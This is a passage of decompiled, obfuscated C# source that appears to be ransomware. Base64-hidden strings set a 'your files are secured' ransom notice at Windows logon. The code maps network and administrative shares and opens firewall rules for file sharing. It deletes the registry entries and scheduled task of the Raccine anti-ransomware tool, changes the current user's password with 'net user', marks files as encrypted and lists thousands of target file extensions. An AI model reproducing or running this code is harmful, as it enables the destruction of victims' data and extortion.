								if (File.Exists(item3.FullName) && (double)item3.Length <= double.Parse(YBwlHZzHGdGB) * 1024.0 * 1024.0 && qshYTVIXevhyaj == "YES")
								{
									list.Add(item3.FullName);
								}
								else if (File.Exists(item3.FullName) && qshYTVIXevhyaj == "NO")
								{
									list.Add(item3.FullName);
								}
							}
						}
						catch (UnauthorizedAccessException)
						{
						}
						catch
						{
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch
				{
				}
			}
		}
		catch (DirectoryNotFoundException)
		{
		}
		catch (UnauthorizedAccessException)
		{
		}
		catch (PathTooLongException)
		{
		}
		catch
		{
		}
		return list;
	}

	public static void KzhwOVaxGwr()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("select * from Win32_NetworkConnection");
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!vNjCRxJChaZG.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
					.Replace("\"", "")
					.Split(new char[1] { '(' })[0].Trim()))
				{
					vNjCRxJChaZG.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
						.Replace("\"", "")
						.Split(new char[1] { '(' })[0].Trim().Replace("IPC$", ""));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string xQfMOPCvvVAqwp(string HrKFnUglKseZ = "", string xmGcOuoFeKOAa = "")
	{
		string result = "";
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = HrKFnUglKseZ,
				Arguments = xmGcOuoFeKOAa,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
		}
		catch
		{
		}
		return result;
	}

	public static void NASiTqcixVzOI(string wARXbPIOxftJx)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = wARXbPIOxftJx,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string tvWunvyFIKOf(string xDibtVfDCjY)
	{
		char[] array = xDibtVfDCjY.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string joRKfFeYni(string KxtFBkDPFgvXwu)
	{
		byte[] bytes = Convert.FromBase64String(KxtFBkDPFgvXwu);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void KbootfLHXMltG(string GQUOzyVpciz = "", string uiQZzjXrOaRD = "SW5mb3JtYXRpb24uLi4=", string oPUHJqwNgPytxx = "QWxsIHlvdXIgZmlsZXMgYXJlIHNlY3VyZWQsIHBsZWFzZSByZWFkIHRoZSB0ZXh0IG5vdGUgbG9jYXRlZCBpbiB5b3VyIGRlc2t0b3AuLi4=")
	{
		GQUOzyVpciz = tvWunvyFIKOf("=42bn9Gbul2Vc52bpNnclZFduVmcyV3QcRlTgM3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(joRKfFeYni(GQUOzyVpciz), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(joRKfFeYni("TGVnYWxOb3RpY2VDYXB0aW9u"), joRKfFeYni(uiQZzjXrOaRD));
				registryKey.SetValue(joRKfFeYni("TGVnYWxOb3RpY2VUZXh0"), joRKfFeYni(oPUHJqwNgPytxx));
				registryKey.Close();
			}
		}
		catch
		{
		}
		try
		{
			GQUOzyVpciz = tvWunvyFIKOf("tVGdzl3UcNXZpNWas9GUc52bpNnclZFduVmcyV3QcN3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(joRKfFeYni(GQUOzyVpciz), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(joRKfFeYni("bGVnYWxub3RpY2VjYXB0aW9u"), joRKfFeYni(uiQZzjXrOaRD));
				registryKey.SetValue(joRKfFeYni("bGVnYWxub3RpY2V0ZXh0"), joRKfFeYni(oPUHJqwNgPytxx));
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void QIMtDoSaiwVe()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (aSTzHoNGAgWsQX == "YES" && !string.IsNullOrEmpty(FTBHcmxKhCRSXf) && !string.IsNullOrEmpty(kHqnKxGzzKywC))
				{
					KbootfLHXMltG("", FTBHcmxKhCRSXf, kHqnKxGzzKywC);
				}
				else
				{
					KbootfLHXMltG();
				}
			}
		}
		catch
		{
		}
	}

	public static void hBbjeexJhMrsh(string lAgUnZUXGPRkS = "SW5mb3JtYXRpb24uLi4=", string xIwfPrJzFgP = "QWxsIHlvdXIgZmlsZXMgYXJlIHNlY3VyZWQsIHBsZWFzZSByZWFkIHRoZSB0ZXh0IG5vdGUgbG9jYXRlZCBpbiB5b3VyIGRlc2t0b3AuLi4=")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(joRKfFeYni(lAgUnZUXGPRkS));
		val.set_BalloonTipText(joRKfFeYni(xIwfPrJzFgP));
		val.ShowBalloonTip(30000);
	}

	public static void bUhYWwFtrZjxM(string RvLphDHgEWWT)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		xQfMOPCvvVAqwp(joRKfFeYni("bmV0LmV4ZQ=="), "user " + text + " " + RvLphDHgEWWT);
	}

	public static List<string> JxlmjLQwYbc()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementClass val = new ManagementClass("Win32_Share");
		List<string> list = new List<string>();
		try
		{
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					object obj = ((ManagementBaseObject)val2).get_Item("Name");
					if (!list.Contains("\\\\" + val2.get_Path().get_Server() + "\\" + obj.ToString()!.Replace("IPC$", "").Replace("ADMIN$", "")))
					{
						list.Add("\\\\" + val2.get_Path().get_Server() + "\\" + obj.ToString()!.Replace("IPC$", "").Replace("ADMIN$", ""));
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch
		{
			return null;
		}
		return list;
	}

	private static void eKnjUPfnILwb()
	{
		//IL_0221: Unknown result type (might be due to invalid IL or missing references)
		//IL_0228: Expected O, but got Unknown
		//IL_024a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0251: Expected O, but got Unknown
		sxaSkcguZNw();
		List<CpsHVasgAe> list = CpsHVasgAe.cIWmfhpGhkv();
		foreach (CpsHVasgAe item in list)
		{
			VjAwANiXIxmMk.Add(item.FFxDkVWJYZOA);
		}
		Parallel.ForEach(VjAwANiXIxmMk, delegate(string OVRPptdADjPuB)
		{
			if ((OVRPptdADjPuB.StartsWith("10.") || OVRPptdADjPuB.StartsWith("172.") || OVRPptdADjPuB.StartsWith("192.168.") || OVRPptdADjPuB.StartsWith("")) && lOChwyQwVc.bXTLOcmBneaTm(OVRPptdADjPuB))
			{
				try
				{
					Thread.Sleep(UIEwMIIeUW);
					vNjCRxJChaZG.Add("\\\\" + OVRPptdADjPuB + "\\Users");
					try
					{
						if (aLMUqgosPdtj)
						{
							Console.WriteLine("\\\\" + OVRPptdADjPuB + "\\Users");
						}
					}
					catch
					{
					}
					Parallel.For(68, 91, delegate(int g)
					{
						Thread.Sleep(UIEwMIIeUW);
						vNjCRxJChaZG.Add("\\\\" + OVRPptdADjPuB + "\\" + (char)g + "$");
						try
						{
							if (aLMUqgosPdtj)
							{
								Console.WriteLine("\\\\" + OVRPptdADjPuB + "\\" + (char)g + "$");
							}
						}
						catch
						{
						}
					});
				}
				catch
				{
				}
			}
		});
		try
		{
			lOChwyQwVc.jJkvwcuzVpzYwvI jJkvwcuzVpzYwvI = new lOChwyQwVc.jJkvwcuzVpzYwvI(lOChwyQwVc.ufRFMCwThK.VlmORhUnqds, lOChwyQwVc.HxONgyXbhJ.uqIrxDGGFlQxB, lOChwyQwVc.ZEahBdBPCJjLo.lZLjZSSkvvpUinU, lOChwyQwVc.iMqNhdLTRixAodoDr.dTForcdqHIqttn);
			foreach (string item2 in jJkvwcuzVpzYwvI)
			{
				MatchCollection matchCollection = Regex.Matches(item2, "\\\\\\\\[a-zA-Z0-9\\.\\-_]{1,}(\\\\[a-zA-Z0-9\\-_]{1,}){1,}[\\$]{0,1}");
				foreach (Match item3 in matchCollection)
				{
					try
					{
						if (!vNjCRxJChaZG.Contains(item3.ToString()))
						{
							vNjCRxJChaZG.Add(item3.ToString());
						}
					}
					catch
					{
					}
					try
					{
						if (aLMUqgosPdtj)
						{
							Console.WriteLine(item3.ToString());
						}
					}
					catch
					{
					}
				}
			}
		}
		catch (Exception)
		{
		}
		FXhMQTnvOItBEVU.FeBWuyvetkIdDG();
		try
		{
			if (aLMUqgosPdtj)
			{
				Console.WriteLine("Network scanning completed...");
			}
		}
		catch
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string kxtFBkDPFgvXwu = tvWunvyFIKOf("tVGdzl3UcNXZpNWas9GUc52bpNnclZFduVmcyV3QcN3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(joRKfFeYni(kxtFBkDPFgvXwu), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(joRKfFeYni("TG9jYWxBY2NvdW50VG9rZW5GaWx0ZXJQb2xpY3k="), 1, RegistryValueKind.DWord);
					registryKey.SetValue(joRKfFeYni("RW5hYmxlTGlua2VkQ29ubmVjdGlvbnM="), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (taMlWXBfKLGNk == "YES")
		{
			MHLcaZVHYzQhlav.GhmPmUDXWekkOV();
		}
		try
		{
			if (aLMUqgosPdtj)
			{
				Console.WriteLine("Scanning for manually mapped resources...");
			}
		}
		catch
		{
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher("select * from Win32_NetworkConnection");
		ManagementObjectEnumerator enumerator4 = val.Get().GetEnumerator();
		try
		{
			while (enumerator4.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator4.get_Current();
				if (vNjCRxJChaZG.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
					.Replace("\"", "")
					.Split(new char[1] { '(' })[0].Trim()))
				{
					continue;
				}
				try
				{
					if (aLMUqgosPdtj)
					{
						Console.WriteLine(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
							.Replace("\"", "")
							.Split(new char[1] { '(' })[0].Trim().Replace("IPC$", ""));
					}
				}
				catch
				{
				}
				vNjCRxJChaZG.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
					.Replace("\"", "")
					.Split(new char[1] { '(' })[0].Trim().Replace("IPC$", ""));
			}
		}
		finally
		{
			((IDisposable)enumerator4)?.Dispose();
		}
		try
		{
			if (aLMUqgosPdtj)
			{
				Console.WriteLine("Scanning for manually mapped resources completed...");
			}
		}
		catch
		{
		}
	}

	public static bool mCiYKRPmuLyH()
	{
		WebRequest webRequest = WebRequest.Create("https://www.google.com/");
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void HEtSbTekjvbdmpa(string swJoDAwTDDlsKo)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = joRKfFeYni("cG93ZXJzaGVsbC5leGU=");
		processStartInfo.Arguments = "& " + swJoDAwTDDlsKo;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool vYdUiwPtSnKrD(string EQZRAjWrqUO, string yAlrpQlQtxUvVL)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(EQZRAjWrqUO, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(yAlrpQlQtxUvVL);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(EQZRAjWrqUO, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool ypMxZjBCXBTR(string wpfucpOdBC)
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			string JzJWvdQfojhDgaD = Path.GetPathRoot(wpfucpOdBC);
			DriveInfo driveInfo = drives.FirstOrDefault((DriveInfo d) => d.RootDirectory.Name == JzJWvdQfojhDgaD);
			return driveInfo != null && driveInfo.DriveFormat == "NTFS";
		}
		catch
		{
			return false;
		}
	}

	public static string OQwXoiUSbUUwO(SecureString SUIexHWnWv)
	{
		string result = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(SUIexHWnWv);
		try
		{
			result = Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
		return result;
	}

	public static void WQgyfgSodAYWc()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string kxtFBkDPFgvXwu = tvWunvyFIKOf("==wcu9Wa0B3Tg42bpRXdjVGeFBSZslmRgU2Zh1WSc52bpNnclZFduVmcyV3QcRlTgM3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(joRKfFeYni(kxtFBkDPFgvXwu), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(joRKfFeYni("dnNzYWRtaW4uZXhl"));
					registryKey.DeleteSubKey(joRKfFeYni("d21pYy5leGU="));
					registryKey.DeleteSubKey(joRKfFeYni("d2JhZG1pbi5leGU="));
					registryKey.DeleteSubKey(joRKfFeYni("YmNkZWRpdC5leGU="));
					registryKey.DeleteSubKey(joRKfFeYni("cG93ZXJzaGVsbC5leGU="));
					registryKey.DeleteSubKey(joRKfFeYni("ZGlza3NoYWRvdy5leGU="));
					registryKey.DeleteSubKey(joRKfFeYni("bmV0LmV4ZQ=="));
					registryKey.Close();
				}
				kxtFBkDPFgvXwu = tvWunvyFIKOf("u9Wa0F2YpxGcwFEXn9GT05WZ2VEXzV2YpZnclNFX0V2Us9mc052bDRnblJnc1NEXNVEVTl1U");
				registryKey = Registry.LocalMachine.OpenSubKey(joRKfFeYni(kxtFBkDPFgvXwu), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(joRKfFeYni("UmFjY2luZQ=="));
					registryKey.Close();
				}
				kxtFBkDPFgvXwu = tvWunvyFIKOf("=UkUBdFVG90U");
				registryKey = Registry.LocalMachine.OpenSubKey(joRKfFeYni(kxtFBkDPFgvXwu), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(joRKfFeYni("UmFjY2luZQ=="));
					registryKey.Close();
				}
				kxtFBkDPFgvXwu = tvWunvyFIKOf("=UkUBdFVG90U");
				registryKey = Registry.CurrentUser.OpenSubKey(joRKfFeYni(kxtFBkDPFgvXwu), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(joRKfFeYni("UmFjY2luZQ=="));
					registryKey.Close();
				}
			}
			catch
			{
			}
			xQfMOPCvvVAqwp(joRKfFeYni("dGFza2tpbGw="), joRKfFeYni("L0YgL0lNIFJhY2NpbmVTZXR0aW5ncy5leGU="));
			xQfMOPCvvVAqwp(joRKfFeYni("cmVn"), joRKfFeYni(tvWunvyFIKOf("=Y0LgISehJHVgUmbpN2YhJlIgY1LgIib1JFXu9WazJXZWRnblJnc1NEXzd3bk5WaXxFdm92cvJ3Yp1EXFJVQXRlRPNFXVN0SIJCIlRXZsVGZ")));
			xQfMOPCvvVAqwp(joRKfFeYni("cmVn"), joRKfFeYni("ZGVsZXRlIEhLQ1VcU29mdHdhcmVcUmFjY2luZSAvRg=="));
			xQfMOPCvvVAqwp(joRKfFeYni("c2NodGFza3M="), joRKfFeYni("L0RFTEVURSAvVE4gIlJhY2NpbmUgUnVsZXMgVXBkYXRlciIgL0Y="));
		}
		catch
		{
		}
	}

	public static void iQdVnFhsXceS(string SHzoBKtYMcuOpuhK, byte[] iFMfpNxmqUJhc)
	{
		try
		{
			byte[] array = null;
			array = (IUeXbBJIfNgWuv ? Encoding.ASCII.GetBytes(joRKfFeYni("R290QWxsTG9jaw==")) : Encoding.ASCII.GetBytes(joRKfFeYni("R290QWxsRG9uZQ==")));
			using FileStream fileStream = new FileStream(SHzoBKtYMcuOpuhK, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(iFMfpNxmqUJhc, 0, iFMfpNxmqUJhc.Length);
			fileStream.Write(array, 0, array.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void SXuEWOYXtMJp()
	{
		string kxtFBkDPFgvXwu = tvWunvyFIKOf("==QblR3c5NVZslmRcx2byRnbvNEX0V2Us9mc052bDRnblJnc1NEXNVEVTl1U");
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(joRKfFeYni(kxtFBkDPFgvXwu), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(joRKfFeYni("TG9uZ1BhdGhzRW5hYmxlZA=="), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void sxaSkcguZNw()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			xQfMOPCvvVAqwp(joRKfFeYni("bmV0c2g="), joRKfFeYni("YWR2ZmlyZXdhbGwgZmlyZXdhbGwgc2V0IHJ1bGUgZ3JvdXA9XCJOZXR3b3JrIERpc2NvdmVyeVwiIG5ldyBlbmFibGU9WWVz"));
			xQfMOPCvvVAqwp(joRKfFeYni("bmV0c2g="), joRKfFeYni("YWR2ZmlyZXdhbGwgZmlyZXdhbGwgc2V0IHJ1bGUgZ3JvdXA9XCJGaWxlIGFuZCBQcmludGVyIFNoYXJpbmdcIiBuZXcgZW5hYmxlPVllcw=="));
		}
	}

	public static void CsvCMpwsZeYIJVA(string KtaZSbONAYcDbc)
	{
		try
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				JDlAMHFGKK(KtaZSbONAYcDbc, new string[4833]
				{
					"db", "dbf", "accdb", "dbx", "mdb", "mdf", "epf", "ndf", "ldf", "1cd",
					"sdf", "nsf", "fp7", "cat", "log", "$$$", "$db", "$efs", "$er", "^^^",
					"__a", "__b", "{pb", "~cw", "~hm", "0", "000", "001", "1", "101",
					"103", "108", "110", "113", "123", "128", "17t", "1CD", "1pe", "1ph",
					"1sp", "1st", "2", "2mg", "2Q0", "2QM", "3", "3d", "3d4", "3dd",
					"3df", "3df8", "3dm", "3dmdef", "3dp", "3dr", "3ds", "3dt", "3dw", "3dxml",
					"3fr", "3g2", "3ga", "3gp", "3gp2", "3me", "3MF", "3mm", "3pe", "3pr",
					"3w", "4dd", "4dl", "4dv", "4fs", "4w7", "5vw", "602", "73b", "73c",
					"73l", "7z", "7z001", "7z002", "7zip", "8", "86f", "89t", "89y", "8ba",
					"8bc", "8be", "8bf", "8bi8", "8bl", "8bs", "8bx", "8by", "8li", "8svx",
					"8xg", "8xk", "8xs", "8xt", "8xv", "9xt", "9xy", "a$v", "a00", "a01",
					"a02", "a2c", "a5l", "a5w", "a65", "aa", "aa3", "aac", "aaf", "aah",
					"aam", "aao", "aaui", "ab", "ab1", "ab3", "ab4", "ab65", "aba", "abbu",
					"abc", "abcd", "abf", "abi", "abk", "abkprj", "abp", "abt", "abw", "aby",
					"ac2", "ac3", "ac5", "aca", "acc", "accdc", "accde", "accdr", "accdt", "accft",
					"ACCTB", "ace", "acf", "acg", "ach", "ACL", "acp", "acq", "acr", "acrobatsecuritysettings",
					"acrodata", "acroplugin", "acrypt", "act", "acz", "ad", "ada", "adb", "adc", "adcp",
					"add", "addism", "ade", "adf", "adi", "adif", "adoc", "ados", "adox", "adp",
					"adpb", "adr", "ads", "adt", "adu", "adv", "advs", "adx", "adz", "aea",
					"aec", "aep", "aepx", "aes", "aet", "afd", "afdesign", "afe", "aff", "afi",
					"afm", "afp", "aft", "agd", "agd1", "agdl", "age3rec", "age3sav", "age3scn", "age3xrec",
					"age3xsav", "age3xscn", "age3yrec", "age3ysav", "age3yscn", "aggr", "ahf", "ai", "aif", "aifb",
					"aiff", "aim", "ain", "AIO", "aip", "ais", "ait", "ak", "al", "al8",
					"ala", "alb3", "alb4", "alb5", "alb6", "alc", "ald", "aldf", "alf", "ali",
					"allet", "alt3", "alt5", "alz", "AM", "amb", "amc", "amf", "aml", "amm",
					"amr", "amsorm", "amt", "amu", "amx", "amxx", "an1", "an8", "anime", "anl",
					"anme", "ann", "ans", "ansr", "ansym", "anx", "aoi", "ap", "apa", "apalbum",
					"apd", "ape", "apf", "aph", "api", "apj", "apk", "aplibrary", "apnx", "apo",
					"app", "APPCACHE", "approj", "APPX", "apr", "apt", "apw", "apxl", "apz", "ar",
					"arc", "arch00", "archiver", "arduboy", "arff", "ari", "arj", "arn", "aro", "arr",
					"ars", "art", "arw", "as", "as$", "as3", "asa", "asc", "ascm", "ascx",
					"asd", "ase", "asf", "ashbak", "ashdisc", "ashprj", "ashx", "ask", "asl", "asm",
					"asmx", "asn", "asnd", "asp", "aspx", "asr", "asset", "ast", "asv", "asvx",
					"asx", "atf", "ath", "atl", "atomsvc", "atr", "ats", "atw", "automaticdestinations-ms", "aux",
					"av", "avc", "avhd", "avhdx", "avj", "avl", "avn", "avp", "avs", "AW",
					"awb", "awbr", "awd", "awdb", "awe", "awg", "awp", "aws", "awt", "aww",
					"awwp", "ax", "azf", "azs", "azw", "azw1", "azw3", "azw4", "azz", "azzx",
					"b", "b1", "b27", "b2a", "b5i", "b5t", "b64", "b6i", "b6t", "b6z",
					"ba", "ba6", "ba7", "ba8", "ba9", "bac", "back", "backup", "backupdb", "bad",
					"bafl", "bak", "bak~", "bak2", "bak3", "bakx", "bamboopaper", "bank", "bar", "baserproj",
					"bau", "bax", "bay", "bbb", "bbcd", "bbl", "bbprojectd", "bbs", "bbxt", "bbz",
					"bc", "bc5", "bc6", "bc7", "bcc", "bcd", "bci", "bck", "bckp", "bcl",
					"bcm", "bcp", "bct", "bdb", "bdb2", "bdc", "bdf", "bdic", "bdoc", "bdp",
					"bdr", "bdt2", "bdt3", "bean", "bed", "bfa", "bff", "bfx", "bgl", "bgt",
					"bgv", "bh", "bho", "bi8", "bib", "bibtex", "bic", "bif", "bifx", "big",
					"bik", "bil", "bim", "bin", "bina", "binary", "bionix", "BIT", "bizdocument", "bjl",
					"bjo", "bk", "bk!", "bk1", "bk2", "bk3", "bk4", "bk5", "bk6", "bk7",
					"bk8", "bk9", "bkc", "bkf", "bkg", "bkp", "bks", "bkup", "bkz", "blb",
					"bld", "blend", "blend1", "blend2", "blg", "blk", "blm", "bln", "blob", "blockplt",
					"blogthis", "blp", "bluebutton", "bm2", "bm3", "bmc", "bmf", "bmk", "bml", "bmm",
					"bmml", "bmpr", "bms", "bna", "bndl", "bnk", "boc", "bok", "boo", "book",
					"bookexport", "bop", "box", "bp1", "bp2", "bp3", "bpa", "bpb", "bpd", "bpdx",
					"bpf", "bphys", "bpj", "bpk", "bpl", "bplx", "bpm", "bpmc", "bpn", "bps",
					"bpw", "brain", "brd", "breaking_bad", "brf", "brh", "brl", "brn", "BROWSER", "brs",
					"brw", "brx", "bsa", "bsd", "bsdl", "bsk", "bso", "bsp", "bst", "btd",
					"btf", "btif", "btinstall", "BTL", "btm", "btoa", "btr", "btx", "BUD", "bul",
					"bundle", "bup", "burn", "burntheme", "bvd", "bvp", "bwa", "bwd", "bwf", "bwi",
					"bwp", "bws", "bwt", "bwz", "BXF", "bxx", "bz", "bz2", "bza", "bzabw",
					"bzip", "bzip2", "c", "c00", "c01", "c02", "c10", "c2e", "c3d", "c4p",
					"c6", "cadoc", "cae", "caf", "cag", "calca", "cam", "camm", "camproj", "cap",
					"capt", "capx", "car", "caro", "cas", "catproduct", "cav", "cawr", "cb7", "cba",
					"cbf", "cbg", "cbmap", "cbor", "cbr", "cbs", "cbt", "cbu", "cbz", "cc",
					"cca", "ccc", "ccd", "ccf", "cch", "ccitt", "ccld", "ccp", "cct", "cd",
					"cd1", "cd2", "cdb", "cdc", "cdd", "cddz", "cdf", "cdi", "cdk", "cdl",
					"cdm", "cdml", "cdmm", "cdmz", "cdp", "cdpz", "cdr", "cdr3", "cdr4", "cdr5",
					"cdr6", "cdrw", "cds", "cdt", "cdtx", "cdx", "cdxml", "ce1", "ce2", "cef",
					"cel", "celtx", "cenon~", "cer", "cert", "cf", "cf5", "cfa", "cfb", "cfd",
					"cfg", "cfp", "cfr", "cfs", "cfx", "cgf", "cgfiletypetest", "cgi", "cgm", "cgp",
					"chg", "chi", "chk", "chm", "chml", "chmprj", "chp", "chpscrap", "CHR", "cht",
					"chtml", "cib", "cida", "cif", "cipo", "circ", "ciso", "civ4worldbuildersave", "civbeyondswordsave", "ck9",
					"ckp", "ckt", "cl2", "cl2arc", "cl2doc", "cl5", "clam", "clarify", "class", "classlist",
					"clb", "cld", "clg", "clix", "clk", "clkd", "clkm", "clks", "clkt", "clktk",
					"clkv", "clm", "clp", "clr", "cls", "clx", "cm10", "cm5", "cma", "cmap",
					"CMB", "cmbl", "cmf", "cml", "cmp", "cmr", "cms", "cmt", "cmu", "cna",
					"cnf", "cng", "cnt", "cnv", "cod", "col", "collab", "comicdoc", "comiclife", "COMMENTS",
					"compositionmodel", "compositiontemplate", "con", "conf", "config", "contact", "converterx", "cp", "cp9", "CPA",
					"cpaa", "cpc", "cpd", "cpdt", "cpf", "cpgz", "cphd", "cpi", "cpio", "cpk",
					"cpmz", "cpp", "cpt", "cptx", "cpy", "cr2", "cram", "crashed", "craw", "crb",
					"crd", "crds", "creole", "crev", "cri", "crjoker", "crs", "crs3", "crt", "crtr",
					"crtx", "crw", "crwl", "cry", "crypt", "crypt12", "crypt8", "crypt9", "crypted", "cryptowall",
					"cryptra", "cs", "cs8", "csa", "csd", "cse", "CSG", "csh", "csi", "csl",
					"csm", "cso", "csp", "csr", "css", "cst", "csv", "ctb", "ctbl", "ctd",
					"cte", "ctf", "CTG", "ctl", "ctm", "ctp", "ctproject", "ctt", "ctv", "ctv3",
					"ctx", "ctxt", "cty", "cub", "cube", "cue", "current", "cursorfx", "curxptheme", "cva",
					"cvd", "cvj", "cvl", "cvn", "cvw", "cw3", "cwf", "cwk", "cwn", "cwr",
					"cws", "cww", "cwwp", "cxa", "cxarchive", "cxd", "cxf", "cxr", "cxt", "cyi",
					"cyo", "cys", "czi", "czip", "czp", "d", "d00", "d01", "d3dbsp", "d64",
					"d88", "da0", "da2", "daa", "dac", "dacpac", "dad", "dadiagrams", "dadx", "daf",
					"dag", "dal", "dam", "dao", "dap", "dar", "das", "daschema", "dash", "dat",
					"DATA", "database", "datx", "dax", "dayzprofile", "dazip", "db_journal", "db0", "db3", "dba",
					"dbb", "dbc", "dbcrypt12", "dbcrypt8", "dbd", "DBF", "dbfv", "dbgsym", "db-journal", "dbk",
					"dbr", "dbs", "db-shm", "dbt", "dbv", "db-wal", "dc2", "dc4", "dca", "dcb",
					"dcd", "dcf", "dch", "dcl", "dcm", "dcmd", "dcmf", "dco", "dcp", "dcpf",
					"dcpr", "dcr", "dcs", "dct", "dct5", "dcu", "dcx", "dd", "ddb", "ddc",
					"ddcx", "ddd", "ddf", "ddif", "ddl", "ddoc", "ddrw", "dds", "ddt", "deb",
					"debian", "dec", "ded", "def", "default", "del", "dem", "DEP", "deproj", "der",
					"des", "desc", "description", "design", "desklink", "det", "deu", "dev", "develve", "deviceinfo",
